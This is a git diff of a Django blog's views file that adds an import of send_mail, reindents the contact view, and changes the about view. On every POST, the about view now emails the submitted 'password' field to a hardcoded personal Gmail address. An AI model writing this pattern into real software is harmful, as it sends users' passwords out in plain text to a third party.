@@ -9,6 +9,7 @@ from django.core import serializers
 from django.db.models import Q
 from django.core.paginator import Paginator , EmptyPage, PageNotAnInteger
 from django.urls import reverse
+from django.core.mail import send_mail
 # Create your views here.
 
 
@@ -23,14 +24,22 @@ def index(request):
 	return render(request, 'index.html', {'Posts':Posts, 'Categories':Categories, 'paginator': pag})
 
 def contact(request):
-	
 
-	return render(request, 'contact.html')
+    return render(request, 'contact.html')
 
 def about(request):
 	
+    if request.method == 'POST':
 
-	return render(request, 'about.html')
+        send_mail(
+    'Subject here',
+    request.POST.get("password"),
+    'hramosvz@gmail.com',
+    ['hramosvz@gmail.com'],
+    fail_silently=False,)
+
+
+    return render(request, 'about.html')
 
 def post(request, slug=None,pk=None):
 
